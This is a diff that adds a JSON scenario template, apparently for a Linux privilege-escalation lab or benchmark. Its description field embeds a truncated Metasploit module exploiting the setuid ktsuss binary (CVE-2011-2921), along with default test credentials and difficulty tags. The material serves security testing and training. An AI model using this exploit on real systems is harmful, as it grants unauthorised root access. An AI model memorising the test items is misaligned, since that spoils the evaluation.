@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47344",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ktsuss 1.4 - suid Privilege Escalation (Metasploit) (CVE-2011-2921)\n\nExploit source code (47344.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ktsuss suid Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges by exploiting\n        a vulnerability in ktsuss versions 1.4 and prior.\n\n        The ktsuss executable is setuid root and does not drop\n        privileges prior to executing user specified commands,\n        resulting in command execution with root privileges.\n\n        This module has been tested successfully on:\n\n        ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and\n        ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'John Lightsey', # Discovery and exploit\n          'bcoles'         # Metasploit\n        ],\n      'DisclosureDate' => '2011-08-13',\n      'References'     =>\n        [\n          ['CVE', '2011-2921'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2011/08/13/2'],\n          ['URL', 'https://security.gentoo.org/glsa/201201-15'],\n          ['URL', 'https://github.com/bcoles/local-exploits/blob/master/CVE-2011-2921/ktsuss-lpe.sh']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'DefaultOptions' =>\n        {\n          'AppendExit'       => true,\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependSetreuid'  => true,\n          'PrependSetuid'    => true,\n          'PrependFork'      => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('KTSUSS_PATH', [true, 'Path to staprun executable', '/usr/bin/ktsuss'])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit', [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def ktsuss_path\n    datastore['KTSUSS_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def check\n    unless setuid? ktsuss_path\n      vprint_error \"#{ktsuss_path} is not setuid\"\n      return CheckCode::Safe\n\n```",
+  "cve": "CVE-2011-2921",
+  "exploitdb_id": "47344",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47344",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
